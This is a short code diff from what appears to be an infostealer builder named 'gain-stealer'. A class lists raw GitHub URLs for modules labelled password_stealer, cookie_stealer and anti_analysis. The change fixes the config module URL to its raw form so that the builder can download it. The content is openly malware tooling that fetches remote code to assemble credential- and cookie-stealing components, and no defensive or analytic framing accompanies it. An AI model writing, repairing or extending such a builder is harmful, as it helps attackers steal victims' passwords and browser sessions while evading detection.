@@ -18,7 +18,7 @@ class ModularGainBuilder:
         
         self.raw_urls = {
             'imports': 'https://raw.githubusercontent.com/exsarorrayzer/gain-stealer/refs/heads/main/raw/imports.py',
-            'config': 'https://github.com/exsarorrayzer/gain-stealer/blob/main/raw/config.py',
+            'config': 'https://raw.githubusercontent.com/exsarorrayzer/gain-stealer/refs/heads/main/raw/config.py',
             'anti_analysis': 'https://raw.githubusercontent.com/exsarorrayzer/gain-stealer/refs/heads/main/raw/anti_analysis.py',
             'password_stealer': 'https://raw.githubusercontent.com/exsarorrayzer/gain-stealer/refs/heads/main/raw/password_stealer.py',
             'cookie_stealer': 'https://raw.githubusercontent.com/exsarorrayzer/gain-stealer/refs/heads/main/raw/cookie_stealer.py',
